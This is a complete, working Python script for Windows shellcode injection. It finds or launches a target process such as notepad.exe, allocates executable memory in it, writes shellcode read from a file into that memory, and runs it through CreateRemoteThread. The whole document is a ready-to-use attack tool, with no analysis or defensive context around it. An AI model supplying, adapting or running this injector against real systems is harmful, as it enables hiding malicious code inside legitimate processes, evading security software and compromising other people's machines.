#!/usr/bin/env python3
import sys
import struct
import ctypes
import ctypes.wintypes
import psutil

# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

def find_process(name):
    """Find process by name"""
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == name.lower():
            return proc.info['pid']
    return None

def inject_shellcode(pid, shellcode):
    """Inject shellcode into target process"""
    print(f"[*] Opening process {pid}...")
    
    # Get handle to target process
    kernel32 = ctypes.windll.kernel32
    PROCESS_ALL_ACCESS = 0x1F0FFF
    
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        print("[-] Failed to open process!")
        return False
    
    print("[*] Allocating memory in target process...")
    
    # Allocate memory in target process
    allocated_mem = kernel32.VirtualAllocEx(
        h_process,
        0,
        len(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    
    if not allocated_mem:
        print("[-] Failed to allocate memory!")
        return False
    
    print(f"[*] Allocated memory at: 0x{allocated_mem:016x}")
    print("[*] Writing shellcode to process memory...")
    
    # Write shellcode to allocated memory
    bytes_written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(
        h_process,
        allocated_mem,
        shellcode,
        len(shellcode),
        ctypes.byref(bytes_written)
    )
    
    print(f"[*] Wrote {bytes_written.value} bytes")
    print("[*] Creating remote thread...")
    
    # Create remote thread to execute shellcode
    thread_handle = kernel32.CreateRemoteThread(
        h_process,
        None,
        0,
        allocated_mem,
        None,
        0,
        None
    )
    
    if thread_handle:
        print("[+] Injection successful! Thread handle: 0x{:x}".format(thread_handle))
        return True
    else:
        print("[-] Failed to create remote thread!")
        return False

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 process_injector.py <target_process> <shellcode_file>")
        print("Example: python3 process_injector.py notepad.exe shellcode.bin")
        sys.exit(1)
    
    target = sys.argv[1]
    shellcode_file = sys.argv[2]
    
    print(f"[*] Target process: {target}")
    print(f"[*] Shellcode file: {shellcode_file}")
    
    # Find target process
    pid = find_process(target)
    if not pid:
        print(f"[-] Process {target} not found!")
        print("[*] Starting process...")
        import subprocess
        subprocess.Popen(target)
        import time
        time.sleep(2)
        pid = find_process(target)
        if not pid:
            print("[-] Failed to start process!")
            sys.exit(1)
    
    print(f"[+] Found process: {target} (PID: {pid})")
    
    # Read shellcode
    try:
        with open(shellcode_file, 'rb') as f:
            shellcode = f.read()
        print(f"[+] Loaded shellcode: {len(shellcode)} bytes")
    except:
        print(f"[-] Failed to read shellcode file: {shellcode_file}")
        sys.exit(1)
    
    # Inject shellcode
    if inject_shellcode(pid, shellcode):
        print("[+] Injection completed successfully!")
    else:
        print("[-] Injection failed!")

if __name__ == "__main__":
    main()
